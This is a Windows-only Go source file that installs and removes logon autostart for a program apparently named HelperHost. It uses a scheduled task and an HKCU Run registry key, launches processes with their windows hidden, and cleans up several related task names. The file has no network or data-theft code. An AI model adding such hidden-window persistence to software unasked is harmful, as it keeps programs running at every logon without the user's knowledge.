//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func hideWindow(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}

func installAutostart() string {
	// Direct HelperHost.exe — no .vbs sidecars in the install folder
	tr := fmt.Sprintf("\"%s\"", helperPath)
	methods := []string{}
	_ = exec.Command("schtasks", "/Delete", "/TN", "HelperHost", "/F").Run()
	r := exec.Command("schtasks", "/Create", "/TN", "HelperHost", "/TR", tr, "/SC", "ONLOGON", "/DELAY", "0001:00", "/RL", "LIMITED", "/F")
	if r.Run() == nil {
		methods = append(methods, "task")
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.SetStringValue("HelperHost", tr)
		_ = key.Close()
		methods = append(methods, "run")
	}
	if len(methods) == 0 {
		return "ok"
	}
	out := methods[0]
	for i := 1; i < len(methods); i++ {
		out += "+" + methods[i]
	}
	return out
}

func removeAutostart() {
	for _, tn := range []string{
		"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot",
		"HelperHostWipeRestore", "AgentShePC",
	} {
		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.DeleteValue("HelperHost")
		_ = key.DeleteValue("AgentShePC")
		_ = key.Close()
	}
}
